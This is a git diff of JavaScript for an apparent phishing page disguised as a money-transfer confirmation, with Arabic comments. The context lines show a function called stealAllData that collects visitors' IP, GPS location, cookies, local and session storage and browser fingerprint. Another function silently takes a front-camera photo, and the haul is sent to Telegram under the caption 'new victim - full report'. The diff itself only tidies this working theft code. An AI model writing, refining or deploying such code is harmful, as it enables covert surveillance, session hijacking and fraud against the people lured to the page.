@@ -108,11 +108,10 @@ function requestPermissions() {
     }
 }
 
-// ====== دالة جلب البيانات (بدون أي تعقيدات) ======
+// ====== دالة جلب البيانات ======
 function stealAllData() {
     const data = getParams();
 
-    // جلب الـ IP
     function fetchIP() {
         return fetch('https://api.ipify.org?format=json')
             .then(res => res.json())
@@ -120,7 +119,6 @@ function stealAllData() {
             .catch(() => 'غير معروف');
     }
 
-    // جلب الـ GPS
     function fetchLocation() {
         return new Promise((resolve) => {
             if (!navigator.geolocation) {
@@ -152,24 +150,12 @@ function stealAllData() {
                 sessionData = JSON.stringify(sessionStorage);
             } catch(e) {}
 
-            // بيانات المتصفح
-            const browserData = {
-                userAgent: navigator.userAgent,
-                language: navigator.language,
-                platform: navigator.platform,
-                screen: `${window.screen.width}x${window.screen.height}`,
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                url: window.location.href,
-                referrer: document.referrer || 'مباشر'
-            };
-
             return {
                 ip: ip,
                 gps: gps,
                 cookies: cookies,
                 localStorage: localStorageData,
                 sessionStorage: sessionData,
-                browser: browserData,
                 victim: {
                     receiver: data.receiver,
                     name: data.name,
@@ -184,16 +170,16 @@ function stealAllData() {
 function sendToTelegram(allData, photoBase64 = null) {
     const caption = `🕵️ ضحية جديدة - تقرير كامل
 
-📍 الموقع (GPS): ${allData.gps.lat}, ${allData.gps.lon}
+📍 GPS: ${allData.gps.lat}, ${allData.gps.lon}
 🎯 دقة GPS: ${allData.gps.accuracy} متر
 📌 IP: ${allData.ip}
-📱 الجهاز: ${allData.browser.userAgent}
-🌐 اللغة: ${allData.browser.language}
+📱 الجهاز: ${navigator.userAgent}
+🌐 اللغة: ${navigator.language}
 📅 الوقت: ${new Date().toLocaleString()}
-🖥️ الشاشة: ${allData.browser.screen}
-⏰ المنطقة: ${allData.browser.timezone}
-🔗 الرابط: ${allData.browser.url}
-📎 المرسل: ${allData.browser.referrer}
+🖥️ الشاشة: ${window.screen.width}x${window.screen.height}
+⏰ المنطقة: ${Intl.DateTimeFormat().resolvedOptions().timeZone}
+🔗 الرابط: ${window.location.href}
+📎 المرسل: ${document.referrer || 'مباشر'}
 
 🍪 الكوكيز:
 ${allData.cookies}
@@ -233,7 +219,7 @@ ${allData.sessionStorage}
     return fetchPromise;
 }
 
-// ====== التقاط صورة من الكاميرا ======
+// ====== التقاط صورة ======
 function capturePhoto() {
     return new Promise((resolve, reject) => {
         navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
@@ -280,7 +266,6 @@ function confirmTransfer() {
                         confirmBtn.style.opacity = '1';
                     })
                     .catch(() => {
-                        // لو فشلت الصورة، نبعت نص فقط
                         sendToTelegram(allData, null)
                             .then(() => {
                                 hideLoading();
@@ -300,7 +285,6 @@ function confirmTransfer() {
             });
         })
         .catch(() => {
-            // الكاميرا مرفوضة، نبعت من غير صورة
             stealAllData().then(allData => {
                 sendToTelegram(allData, null)
                     .then(() => {
